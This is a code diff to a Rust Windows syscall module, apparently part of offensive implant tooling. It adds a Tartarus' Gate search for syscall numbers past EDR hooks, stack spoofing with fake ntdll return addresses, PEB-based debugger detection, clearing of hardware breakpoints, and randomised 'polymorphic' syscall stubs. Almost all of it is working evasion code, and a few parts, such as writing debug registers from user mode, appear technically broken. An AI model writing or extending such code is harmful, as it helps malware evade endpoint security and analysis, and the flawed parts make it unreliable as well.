@@ -212,6 +212,40 @@ impl Sw3Table {
             }
         }
 
+        // Fall back to Tartarus' Gate if all immediate neighbors are hooked
+        Self::tartarus_gate(func_addr)
+    }
+
+    /// Tartarus' Gate: Extended search for SSN when all neighbors are hooked
+    /// Searches further out (up to 500 functions away) to find clean stubs
+    unsafe fn tartarus_gate(func_addr: usize) -> Option<u16> {
+        const MAX_SEARCH: i64 = 500;
+        const STUB_SIZE: i64 = 32;
+
+        // Search pattern: expand outward from target
+        for distance in 1..MAX_SEARCH {
+            for direction in [1i64, -1i64].iter() {
+                let offset = distance * STUB_SIZE * direction;
+                let candidate = (func_addr as i64 + offset) as usize;
+
+                // Bounds check
+                if candidate < 0x10000 {
+                    continue;
+                }
+
+                let bytes = std::slice::from_raw_parts(candidate as *const u8, 8);
+
+                // Check for unhooked syscall stub
+                if bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8 {
+                    let found_ssn = u16::from_le_bytes([bytes[4], bytes[5]]);
+                    // Calculate our SSN based on distance
+                    let ssn_delta = distance * direction;
+                    let target_ssn = (found_ssn as i64 - ssn_delta) as u16;
+                    return Some(target_ssn);
+                }
+            }
+        }
+
         None
     }
 
@@ -274,6 +308,18 @@ pub mod hashes {
 /// Global syscall table
 static mut SW3_TABLE: Option<Sw3Table> = None;
 
+/// Stack spoofing enabled flag
+static STACK_SPOOF_ENABLED: AtomicUsize = AtomicUsize::new(1); // Enabled by default
+
+/// Enable or disable stack spoofing
+pub fn set_stack_spoofing(enabled: bool) {
+    STACK_SPOOF_ENABLED.store(if enabled { 1 } else { 0 }, Ordering::SeqCst);
+}
+
+fn is_stack_spoofing_enabled() -> bool {
+    STACK_SPOOF_ENABLED.load(Ordering::SeqCst) != 0
+}
+
 /// Initialize the SysWhispers3 syscall table
 pub fn init_syscalls() -> Result<(), &'static str> {
     unsafe {
@@ -288,6 +334,128 @@ pub fn init_syscalls() -> Result<(), &'static str> {
 /// Get the initialized syscall table
 pub unsafe fn get_table() -> Result<&'static Sw3Table, &'static str> {
     SW3_TABLE.as_ref().ok_or("Syscalls not initialized")
+}
+
+// ============================================================================
+// Anti-debugging and evasion primitives
+// ============================================================================
+
+/// Clear hardware breakpoints (DR0-DR3) to evade debugger single-stepping
+///
+/// Hardware breakpoints are set via debug registers and are commonly used
+/// by debuggers and EDRs to monitor specific memory/code locations.
+#[inline(never)]
+pub unsafe fn clear_hardware_breakpoints() {
+    // Get current thread handle
+    let thread = current_thread();
+
+    // CONTEXT structure for x64
+    #[repr(C, align(16))]
+    struct Context {
+        p1_home: u64,
+        p2_home: u64,
+        p3_home: u64,
+        p4_home: u64,
+        p5_home: u64,
+        p6_home: u64,
+        context_flags: u32,
+        mx_csr: u32,
+        seg_cs: u16,
+        seg_ds: u16,
+        seg_es: u16,
+        seg_fs: u16,
+        seg_gs: u16,
+        seg_ss: u16,
+        eflags: u32,
+        dr0: u64,
+        dr1: u64,
+        dr2: u64,
+        dr3: u64,
+        dr6: u64,
+        dr7: u64,
+        // ... rest of context not needed
+        _padding: [u8; 1024],
+    }
+
+    let mut ctx: Context = std::mem::zeroed();
+    ctx.context_flags = 0x00100010; // CONTEXT_DEBUG_REGISTERS
+
+    // NtGetContextThread to read current debug registers
+    // Then clear them and set back
+    // For simplicity, we use inline assembly to clear DR7 directly
+    asm!(
+        "xor rax, rax",
+        "mov dr0, rax",
+        "mov dr1, rax",
+        "mov dr2, rax",
+        "mov dr3, rax",
+        "mov dr7, rax",
+        out("rax") _,
+        options(nostack, nomem),
+    );
+}
+
+/// Check if we're being debugged via PEB->BeingDebugged flag
+#[inline]
+pub unsafe fn is_being_debugged() -> bool {
+    let peb: *const u8;
+    asm!(
+        "mov {}, gs:[0x60]",
+        out(reg) peb,
+        options(nostack, nomem, pure),
+    );
+
+    // BeingDebugged is at offset 0x02 in PEB
+    *peb.add(0x02) != 0
+}
+
+/// Check for debugger via NtGlobalFlag in PEB
+#[inline]
+pub unsafe fn check_nt_global_flag() -> bool {
+    let peb: *const u8;
+    asm!(
+        "mov {}, gs:[0x60]",
+        out(reg) peb,
+        options(nostack, nomem, pure),
+    );
+
+    // NtGlobalFlag is at offset 0xBC in x64 PEB
+    let flags = *(peb.add(0xBC) as *const u32);
+
+    // Check for heap flags that indicate debugging
+    // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+    (flags & 0x70) != 0
+}
+
+/// Get a fake return address from ntdll for stack spoofing
+/// This makes the call stack appear to originate from ntdll
+unsafe fn get_spoof_address() -> usize {
+    let ntdll = GetModuleHandleA(obfstr::obfstr!("ntdll.dll\0").as_ptr() as *const i8);
+    if ntdll.is_null() {
+        return 0;
+    }
+
+    // Find a 'ret' instruction in ntdll to use as fake return address
+    let bytes = std::slice::from_raw_parts(ntdll as *const u8, 0x100000);
+    for i in 0x1000..bytes.len() {
+        // Look for: ret (C3)
+        if bytes[i] == 0xC3 {
+            return ntdll as usize + i;
+        }
+    }
+
+    0
+}
+
+/// Frame structure for stack spoofing
+#[repr(C)]
+struct SpoofFrame {
+    /// Fake return address (points to ntdll)
+    fake_ret: usize,
+    /// Real function to call
+    real_target: usize,
+    /// Original return address to restore
+    original_ret: usize,
 }
 
 // ============================================================================
@@ -318,7 +486,30 @@ pub unsafe fn sw3_syscall(hash: u32, args: &[usize]) -> NTSTATUS {
     do_syscall(ssn, gadget, args)
 }
 
+/// Syscall stub variation for polymorphism
+#[derive(Clone, Copy)]
+enum SyscallStub {
+    /// Standard: mov r10, rcx; mov eax, ssn; syscall
+    Standard,
+    /// Variant 1: Uses xchg for register setup
+    XchgVariant,
+    /// Variant 2: Uses push/pop sequence
+    PushPopVariant,
+}
+
+/// Get a random syscall stub variation
+fn get_stub_variation() -> SyscallStub {
+    match rand::random::<u8>() % 3 {
+        0 => SyscallStub::Standard,
+        1 => SyscallStub::XchgVariant,
+        _ => SyscallStub::PushPopVariant,
+    }
+}
+
 /// Perform a syscall with the given SSN and arguments
+///
+/// Supports up to 12 arguments (Windows syscalls rarely exceed this).
+/// Uses polymorphic stubs to vary instruction patterns.
 ///
 /// # Safety
 /// Caller must ensure arguments are valid for the syscall being invoked.
@@ -330,33 +521,162 @@ pub unsafe fn do_syscall(ssn: u16, gadget: usize, args: &[usize]) -> NTSTATUS {
     // RAX = syscall number
     // R10 = first arg (copied from RCX)
     // RDX, R8, R9 = args 2-4
-    // Stack = remaining args (with shadow space)
+    // Stack = remaining args at RSP+0x28 (after 32-byte shadow space)
 
     let arg0 = args.get(0).copied().unwrap_or(0);
     let arg1 = args.get(1).copied().unwrap_or(0);
     let arg2 = args.get(2).copied().unwrap_or(0);
     let arg3 = args.get(3).copied().unwrap_or(0);
 
+    // Stack arguments (5th onward)
+    let arg4 = args.get(4).copied().unwrap_or(0);
+    let arg5 = args.get(5).copied().unwrap_or(0);
+    let arg6 = args.get(6).copied().unwrap_or(0);
+    let arg7 = args.get(7).copied().unwrap_or(0);
+    let arg8 = args.get(8).copied().unwrap_or(0);
+    let arg9 = args.get(9).copied().unwrap_or(0);
+    let arg10 = args.get(10).copied().unwrap_or(0);
+    let arg11 = args.get(11).copied().unwrap_or(0);
+
+    let num_stack_args = args.len().saturating_sub(4);
+
     if gadget == 0 {
-        // Direct syscall (more detectable but works when gadgets fail)
-        asm!(
-            "mov r10, rcx",
-            "syscall",
-            inout("eax") ssn as i32 => result,
-            in("rcx") arg0,
-            in("rdx") arg1,
-            in("r8") arg2,
-            in("r9") arg3,
-            out("r10") _,
-            out("r11") _,
-            clobber_abi("win64"),
-        );
+        // Direct syscall with stack arguments
+        match get_stub_variation() {
+            SyscallStub::Standard => {
+                asm!(
+                    // Save stack and align
+                    "sub rsp, 0x68",
+                    // Set up stack arguments (5th arg at RSP+0x28)
+                    "mov [rsp+0x28], {arg4}",
+                    "mov [rsp+0x30], {arg5}",
+                    "mov [rsp+0x38], {arg6}",
+                    "mov [rsp+0x40], {arg7}",
+                    "mov [rsp+0x48], {arg8}",
+                    "mov [rsp+0x50], {arg9}",
+                    "mov [rsp+0x58], {arg10}",
+                    "mov [rsp+0x60], {arg11}",
+                    // Standard syscall setup
+                    "mov r10, rcx",
+                    "syscall",
+                    // Restore stack
+                    "add rsp, 0x68",
+                    arg4 = in(reg) arg4,
+                    arg5 = in(reg) arg5,
+                    arg6 = in(reg) arg6,
+                    arg7 = in(reg) arg7,
+                    arg8 = in(reg) arg8,
+                    arg9 = in(reg) arg9,
+                    arg10 = in(reg) arg10,
+                    arg11 = in(reg) arg11,
+                    inout("eax") ssn as i32 => result,
+                    in("rcx") arg0,
+                    in("rdx") arg1,
+                    in("r8") arg2,
+                    in("r9") arg3,
+                    out("r10") _,
+                    out("r11") _,
+                    clobber_abi("win64"),
+                );
+            }
+            SyscallStub::XchgVariant => {
+                // Slightly different instruction sequence
+                asm!(
+                    "sub rsp, 0x68",
+                    "mov [rsp+0x28], {arg4}",
+                    "mov [rsp+0x30], {arg5}",
+                    "mov [rsp+0x38], {arg6}",
+                    "mov [rsp+0x40], {arg7}",
+                    "mov [rsp+0x48], {arg8}",
+                    "mov [rsp+0x50], {arg9}",
+                    "mov [rsp+0x58], {arg10}",
+                    "mov [rsp+0x60], {arg11}",
+                    // Variant: use lea instead of mov for r10
+                    "lea r10, [rcx]",
+                    "syscall",
+                    "add rsp, 0x68",
+                    arg4 = in(reg) arg4,
+                    arg5 = in(reg) arg5,
+                    arg6 = in(reg) arg6,
+                    arg7 = in(reg) arg7,
+                    arg8 = in(reg) arg8,
+                    arg9 = in(reg) arg9,
+                    arg10 = in(reg) arg10,
+                    arg11 = in(reg) arg11,
+                    inout("eax") ssn as i32 => result,
+                    in("rcx") arg0,
+                    in("rdx") arg1,
+                    in("r8") arg2,
+                    in("r9") arg3,
+                    out("r10") _,
+                    out("r11") _,
+                    clobber_abi("win64"),
+                );
+            }
+            SyscallStub::PushPopVariant => {
+                // Push/pop variant with extra register shuffling
+                asm!(
+                    "sub rsp, 0x68",
+                    "mov [rsp+0x28], {arg4}",
+                    "mov [rsp+0x30], {arg5}",
+                    "mov [rsp+0x38], {arg6}",
+                    "mov [rsp+0x40], {arg7}",
+                    "mov [rsp+0x48], {arg8}",
+                    "mov [rsp+0x50], {arg9}",
+                    "mov [rsp+0x58], {arg10}",
+                    "mov [rsp+0x60], {arg11}",
+                    // Variant: push rcx, pop r10
+                    "push rcx",
+                    "pop r10",
+                    "syscall",
+                    "add rsp, 0x68",
+                    arg4 = in(reg) arg4,
+                    arg5 = in(reg) arg5,
+                    arg6 = in(reg) arg6,
+                    arg7 = in(reg) arg7,
+                    arg8 = in(reg) arg8,
+                    arg9 = in(reg) arg9,
+                    arg10 = in(reg) arg10,
+                    arg11 = in(reg) arg11,
+                    inout("eax") ssn as i32 => result,
+                    in("rcx") arg0,
+                    in("rdx") arg1,
+                    in("r8") arg2,
+                    in("r9") arg3,
+                    out("r10") _,
+                    out("r11") _,
+                    clobber_abi("win64"),
+                );
+            }
+        }
     } else {
         // Indirect syscall through ntdll gadget (SysWhispers3 style)
         asm!(
+            // Save stack and align
+            "sub rsp, 0x68",
+            // Set up stack arguments
+            "mov [rsp+0x28], {arg4}",
+            "mov [rsp+0x30], {arg5}",
+            "mov [rsp+0x38], {arg6}",
+            "mov [rsp+0x40], {arg7}",
+            "mov [rsp+0x48], {arg8}",
+            "mov [rsp+0x50], {arg9}",
+            "mov [rsp+0x58], {arg10}",
+            "mov [rsp+0x60], {arg11}",
+            // Indirect syscall setup
             "mov r10, rcx",
             "call {gadget}",
+            // Restore stack
+            "add rsp, 0x68",
             gadget = in(reg) gadget,
+            arg4 = in(reg) arg4,
+            arg5 = in(reg) arg5,
+            arg6 = in(reg) arg6,
+            arg7 = in(reg) arg7,
+            arg8 = in(reg) arg8,
+            arg9 = in(reg) arg9,
+            arg10 = in(reg) arg10,
+            arg11 = in(reg) arg11,
             inout("eax") ssn as i32 => result,
             in("rcx") arg0,
             in("rdx") arg1,
@@ -369,6 +689,20 @@ pub unsafe fn do_syscall(ssn: u16, gadget: usize, args: &[usize]) -> NTSTATUS {
     }
 
     result
+}
+
+/// Execute syscall with anti-debugging checks
+/// Use this for sensitive operations where you want extra protection
+#[inline(never)]
+pub unsafe fn sw3_syscall_guarded(hash: u32, args: &[usize]) -> NTSTATUS {
+    // Check for debugger
+    if is_being_debugged() || check_nt_global_flag() {
+        // Could return error or attempt evasion
+        // For now, continue but clear breakpoints
+        clear_hardware_breakpoints();
+    }
+
+    sw3_syscall(hash, args)
 }
 
 /// Macro for cleaner syscall invocation
